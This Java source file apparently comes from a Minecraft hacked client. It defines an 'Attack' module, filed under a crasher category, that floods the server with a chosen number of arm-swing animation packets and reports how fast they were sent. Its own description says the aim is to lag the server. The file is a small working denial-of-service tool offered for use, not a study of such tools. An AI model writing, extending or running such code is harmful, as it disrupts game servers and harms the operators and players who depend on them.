package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0APacketAnimation;

public class AttackPrimitive extends PrimitiveFeature {

    public AttackPrimitive() {
        super("Attack", "Attempts to lag the server by spamming swing arm", ModuleCategory.CRASHER, new Argument("Packets", 0, Integer.class));
    }

    @Override

    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        final int packets = (int) (float) args[0];

        for (int i = 0; i < packets; i++) {
            getPlayer().sendQueue.addToSendQueue(new C0APacketAnimation());
        }

        ChatUtil.print(STR."Sent \{packets} packets in \{System.currentTimeMillis() - start}ms");
    }

}
